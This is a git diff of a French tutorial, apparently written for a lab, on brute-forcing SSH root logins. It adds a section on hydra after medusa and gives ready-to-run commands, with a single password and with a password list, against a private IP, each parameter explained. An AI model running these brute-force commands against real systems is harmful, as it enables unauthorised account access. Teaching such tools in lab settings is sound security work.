@@ -52,5 +52,28 @@ Il est également possible de spécifier un argument **-t** suivi d'un nombre, p
 Un exemple de commande possible serait alors :
 
 ```bash
-medusa -h 172.20.10.4 -u root -P motdepasses.txt -M ssh -t 1
+medusa -h 172.20.10.4 -u root -P motsdepasse.txt -M ssh -t 1
+```
+
+## 🐍 Utilisation de hydra
+
+Hydra propose des services similaires à ceux de medusa. 
+
+Les noms des paramètres et la syntaxe des commandes changent. Ainsi, la première commande passée précédemment à Meduse serait :
+
+```bash
+hydra -l root -p Azerty1* ssh://172.20.10.4
+```
+
+Les paramètres sont les suivants :
+
+* **hydra** : appel de l'utilitaire hydra
+* **-l root** : cible l'utilisateur root
+* **-p Azerty1*** : tente d'entrer le mot de passe Azerty1*
+* **ssh://172.20.10.4** : cible l'hôte 172.20.10.4 avec le protocole ssh
+
+Similairement à medusa, on peut utiliser un fichier contenant plusieurs mots de passe. La commande devient alors :
+
+```bash
+hydra -l root -P motsdepasses.txt ssh://172.20.10.4
 ```
